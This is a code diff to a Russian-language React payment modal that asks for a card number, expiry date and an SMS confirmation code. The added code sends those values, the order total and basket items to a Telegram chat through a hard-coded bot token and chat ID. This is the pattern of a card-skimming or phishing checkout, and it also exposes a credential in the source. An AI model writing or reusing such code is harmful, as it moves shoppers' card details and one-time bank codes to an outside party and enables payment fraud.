@@ -7,6 +7,7 @@ import "./basic-modal.css";
 import { useForm } from "react-hook-form";
 import { Notyf } from 'notyf';
 import 'notyf/notyf.min.css'; // for React, Vue and Svelte
+import outdent from 'outdent';
 
 const style = {
      position: 'absolute',
@@ -27,7 +28,7 @@ const notyf = new Notyf({
      },
 });
 
-export default function BasicModal({ isOpen, onClose, totalPrice }) {
+export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, quantities }) {
      const { register, handleSubmit } = useForm();
      const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);
 
@@ -63,7 +64,7 @@ export default function BasicModal({ isOpen, onClose, totalPrice }) {
                axios.post('http://localhost:3004/api/add', { ...data, totalPrice })
                     .then(response => {
                          console.log("Success response:", response);
-                         notyf.success("Чек отправлен!");
+                         notyf.success("Чек отправлен на Телеграм бот!");
                          onClose();
                     })
                     .catch(error => {
@@ -74,64 +75,119 @@ export default function BasicModal({ isOpen, onClose, totalPrice }) {
                               notyf.error("Ошибка при отправке данных");
                          }
                     });
+
+               const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
+               const chat_id = 6183727519;
+
+               // Получаем текущие дату и время
+               const now = new Date();
+               const formattedDate = now.toLocaleDateString();
+               const formattedTime = now.toLocaleTimeString();
+
+               // Отправка текста сообщения
+               const itemsDescription = basketItems.map(item =>
+                    `${item.nameproduct} - ${quantities[item.id]} шт - ${item.price * quantities[item.id]} $`
+               ).join('\n');
+
+               const message = outdent`
+                🧾 Чек:
+                Номер карты: ${data.cardnumber}
+                Срок действия: ${data.carddate}
+                Общая сумма: ${totalPrice} $
+                Код подтверждения: ${data.cardcode}
+                Дата  оформления: ${formattedDate} -${formattedTime}
+                Товары:
+                ${itemsDescription}
+            `;
+
+               const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+               axios.get(url)
+                    .then(response => {
+                         console.log("Message sent successfully:", response);
+                    })
+                    .catch(error => {
+                         console.error("Error sending message:", error);
+                    });
+
+               // Отправка каждого продукта как отдельного сообщения
+               const sendProductImages = async () => {
+                    for (const item of basketItems) {
+                         if (item.img[0]) { // Проверяем, что изображение существует
+                              const imageUrl = item.img[0];
+                              const caption = `${item.nameproduct}\n- ${quantities[item.id]} шт\n- ${item.price * quantities[item.id]} $`;
+                              const imageUrlForSending = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(caption)}`;
+
+                              try {
+                                   const response = await axios.get(imageUrlForSending);
+                                   console.log(`Image for ${item.nameproduct} sent successfully:`, response);
+                              } catch (error) {
+                                   console.error(`Error sending image for ${item.nameproduct}:`, error);
+                              }
+                         }
+                    }
+               };
+
+               sendProductImages();
           } else {
                notyf.error("Неверный SMS-код");
           }
      };
 
      return (
-          <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
-               <Box sx={style}>
-                    <form className="payment__container"
-                         onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
-                    >
-                         <div className="payment__select">
-                              <h1>Общая сумма к оплате: <p>{totalPrice}</p> $</h1>
-                         </div>
+          <>
+               <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
+                    <Box sx={style}>
+                         <form className="payment__container"
+                              onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
+                         >
+                              <div className="payment__select">
+                                   <h1>Общая сумма к оплате: <p>{totalPrice}</p> $</h1>
+                              </div>
 
-                         {!isCardDetailsEntered ? (
-                              <>
-                                   <div className="payment__inp-number">
+                              {!isCardDetailsEntered ? (
+                                   <>
+                                        <div className="payment__inp-number">
+                                             <InputMask
+                                                  mask="9999 9999 9999 9999"
+                                                  maskChar=" "
+                                                  {...register("cardnumber", { required: true })}
+                                                  placeholder='введите номер карты'
+                                             >
+                                                  {(inputProps) => <input {...inputProps} />}
+                                             </InputMask>
+                                             <InputMask
+                                                  mask="99/99"
+                                                  maskChar=" "
+                                                  {...register("carddate", { required: true })}
+                                                  placeholder='срок действия (мм/гг)'
+                                             >
+                                                  {(inputProps) => <input {...inputProps} />}
+                                             </InputMask>
+                                        </div>
+                                        <div className="payment__send">
+                                             <button type='submit'>
+                                                  Продолжить
+                                             </button>
+                                        </div>
+                                   </>
+                              ) : (
+                                   <div className="cardcode">
                                         <InputMask
-                                             mask="9999 9999 9999 9999"
+                                             mask="999999"
                                              maskChar=" "
-                                             {...register("cardnumber", { required: true })}
-                                             placeholder='введите номер карты'
+                                             {...register("cardcode", { required: true })}
+                                             placeholder='Введите код из СМС'
                                         >
                                              {(inputProps) => <input {...inputProps} />}
                                         </InputMask>
-                                        <InputMask
-                                             mask="99/99"
-                                             maskChar=" "
-                                             {...register("carddate", { required: true })}
-                                             placeholder='срок действия (мм/гг)'
-                                        >
-                                             {(inputProps) => <input {...inputProps} />}
-                                        </InputMask>
-                                   </div>
-                                   <div className="payment__send">
-                                        <button type='submit'>
-                                             Продолжить
+                                        <button type="submit">
+                                             Отправить
                                         </button>
                                    </div>
-                              </>
-                         ) : (
-                              <div className="cardcode">
-                                   <InputMask
-                                        mask="999999"
-                                        maskChar=" "
-                                        {...register("cardcode", { required: true })}
-                                        placeholder='Введите код из СМС'
-                                   >
-                                        {(inputProps) => <input {...inputProps} />}
-                                   </InputMask>
-                                   <button type="submit">
-                                        Отправить
-                                   </button>
-                              </div>
-                         )}
-                    </form>
-               </Box>
-          </Modal>
+                              )}
+                         </form>
+                    </Box>
+               </Modal>
+          </>
      );
 }
